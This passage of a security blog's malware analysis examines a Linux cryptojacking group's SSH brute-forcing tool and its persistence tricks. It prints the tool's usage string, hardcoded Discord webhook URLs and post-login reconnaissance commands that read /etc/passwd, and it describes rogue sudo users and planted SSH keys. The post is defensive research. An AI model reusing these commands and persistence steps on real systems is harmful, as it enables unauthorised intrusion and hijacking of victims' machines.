\u003Ccode\u003E\u002Fusr\u002F.SQL-Unix\u002F.SQL\u002F.db\u003C\u002Fcode\u003E, used to store part of the commands, is executed via the source built-in in \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E. This script, in turn, contains commands that overwrite \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"417\" height=\"542\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ESeveral shell commands are disabled using bash aliases. The purpose of these configurations is to render the shell inoperable to other operators, whether they are competing in the realms of malware or they’re legitimate users of the system.\u003C\u002Fp\u003E\u003Cp\u003EThe attackers also try to achieve persistence so the loader drops some redundant scripts. Their names differ between versions of the loader, so we will refer to those in the \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E script:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cp\u003E· \u003Ccode\u003E.k93\u003C\u002Fcode\u003E is used to launch the miner (.k4m3l0t)\u003Cbr\u003E\n· \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fsshd\u003C\u002Fcode\u003E is a \u003Ccode\u003Esystemd\u003C\u002Fcode\u003E service script that launches .k93\u003Cbr\u003E\n· \u003Ccode\u003E.5p4rk3l5\u003C\u002Fcode\u003E is a crontab file that executes \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E and \u003Ccode\u003E.k93\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ESeveral persistence methods are employed:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cp\u003E· creating a user and adding it to the sudo group; various names are used: \u003Ccode\u003Egh0stx\u003C\u002Fcode\u003E, \u003Ccode\u003Esclipicibosu\u003C\u002Fcode\u003E, \u003Ccode\u003Emexalzsherifu\u003C\u002Fcode\u003E\u003Cbr\u003E\n· adding a SSH key to \u003Ccode\u003Eauthorized_keys\u003C\u002Fcode\u003E (attackers cycled through three different keys depending on the script)\u003Cbr\u003E\n· creating a \u003Ccode\u003Esystemd\u003C\u002Fcode\u003E service called \u003Ccode\u003Emyservice\u003C\u002Fcode\u003E which runs the \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fsshd\u003C\u002Fcode\u003E script:\u003C\u002Fp\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"640\" height=\"583\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2021\u002F07\u002F5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F5.png 640w\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EMining for Monero\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAll of this effort is currently directed towards Monero mining. While the current campaign concerns cryptojacking, we have connected this group to several DDoS botnets: a Demonbot variant called \u003Ccode\u003Echernobyl\u003C\u002Fcode\u003E and a Perl IRC bot.\u003C\u002Fp\u003E\u003Cp\u003EAs you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems. Owning multiple systems for mining is not cheap, so attackers try the next best thing: to remotely compromise devices and use them for mining instead.\u003C\u002Fp\u003E\u003Cp\u003EIn this case, the group uses custom compiled binaries with embedded configurations of a legitimate miner named \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fxmrig\u002Fxmrig\"\u003EXMRig\u003C\u002Fa\u003E. Typically, the JSON configuration file, which also includes the users and where the currency goes, is external. But in this compiled version, the configuration file in embedded.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F6.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1128\" height=\"166\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2021\u002F07\u002F6.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2021\u002F07\u002F6.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F6.png 1128w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F7.png\" class=\"kg-image\" alt loading=\"lazy\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EUnfortunately, brute force still works\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EPeople are the simple reason why brute-forcing SSH credentials still works. Dedicated tools are required for this process, and, in this situation, it's something developed by the group itself.\u003C\u002Fp\u003E\u003Cp\u003EThis tool, which its author dubbed \"Diicot brute\", is contained in \u003Ccode\u003Ejack.tar.gz\u003C\u002Fcode\u003E and \u003Ccode\u003Ejuanito.tar.gz\u003C\u002Fcode\u003E archives.\u003C\u002Fp\u003E\u003Cp\u003EAs the usage string from the binary shows, it takes as command-line arguments a port, an \"API key\", number of threads, a file containing a list of IP addresses to be scanned, and a timeout value (seconds).\u003C\u002Fp\u003E\u003Cp\u003E\u003Ccode\u003ESyntax: .\u002Fbrute [ Port ] [ Key ] [ Routines ] [ IP File ] [ Timeout ]\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\u003Cp\u003EWritten in Golang, the binary was developed in a single package, which contains the following functions:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F8.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"440\" height=\"203\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EWhile most of the tools used by Mexalz can be used by themselves, the \"Diicot bruter\" is meant to operate on a SaaS (software as a service) model. The binary communicates with three servers:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ean update server (cdn[.]arhive[.]online)\u003C\u002Fli\u003E\n\u003Cli\u003Ean API server (requests[.]arhive[.]online)\u003C\u002Fli\u003E\n\u003Cli\u003EDiscord API servers\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe tool requires an \"API key\", supplied as a command-line argument. The key is provided as a parameter in the API endpoints used to retrieve the user's configuration. The configuration includes the user's Discord ID, a Discord webhook where the tool's output is POSTed, and a version number (presumably, the latest version to which the user is licensed to use).\u003C\u002Fp\u003E\u003Cp\u003EThe \u003Ccode\u003Edabrute\u003C\u002Fcode\u003E and \u003Ccode\u003Ego\u003C\u002Fcode\u003E scripts contain keys of this type. Rather than random strings, they look like user names and differ between the two instances, strengthening the assumption that the owners of this toolkit are distinct individuals belonging to the same threat group that share tools among themselves.\u003C\u002Fp\u003E\u003Cp\u003EDiscord hooks are used to report on:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ethe start and finish of the tool's execution\u003C\u002Fli\u003E\n\u003Cli\u003Esuccessful exploitations\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ETwo types of hooks are used: user-dependent, which are retrieved from the API server using the API key, and global, which are hardcoded.\u003C\u002Fp\u003E\u003Cp\u003EThe global hooks are:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\"https:\u002F\u002Fdiscord\"\u003Ehttps:\u002F\u002Fdiscord\u003C\u002Fa\u003E[.]com\u002Fapi\u002Fwebhooks\u002F796089316517347369\u002FzRjSflkA7z9C4N9PaPWIJQFLMSKGk5iJNv9T_Z880jhLOpkQ3OEGsbdz4GsX80WwRY0g\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca href=\"https:\u002F\u002Fdiscord\"\u003Ehttps:\u002F\u002Fdiscord\u003C\u002Fa\u003E[.]com\u002Fapi\u002Fwebhooks\u002F845977569446068234\u002FggGoh-5DEpMLtIi0OKNc8z3b3MgxjZaxovL0R0dBiMsP0hnMTIkNx_JoFTLKJtbyRSx\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe \u003Ccode\u003Emain.remoteRun\u003C\u002Fcode\u003E function is executed in a dedicated goroutine (lightweight thread) for each (host, username, password) combination. The implementation of the SSH protocol is provided by the standard library package \u003Ccode\u003Egolang.org\u002Fx\u002Fcrypto\u002Fssh\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EAfter a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cpre\u003E\u003Ccode\u003Euname -s -v -n -r -m\nuptime | grep -ohe 'up .*' | sed 's\u002F,\u002F\u002Fg' | awk '{ print $2\\&quot; \\&quot;$3 }'\nuptime | grep -ohe '[0-9.*] user[s,]'\nlscpu | sed -nr '\u002FModel name\u002F s\u002F.*:\\\\s*(.*) @ .*\u002F\\\\1\u002Fp'\nnproc --all\nnvidia-smi -q | grep \\&quot;Product Name\\&quot;\nlspci\ncut -d: -f6 \u002Fetc\u002Fpasswd | grep \\&quot;\u002Fhome\u002F\\&quot;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003ENotably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme.\u003C\u002Fp\u003E\u003Cp\u003EOwing to an auto-update feature in the binaries, we managed to locate where it is hosted and gain insight into how it is distributed. The update server is set up using Github pages.\u003C\u002Fp\u003E\u003Cp\u003EThe repository is revealed by following the redirect chain:\u003C\u002Fp\u003E\u003C!--kg-card-begin:
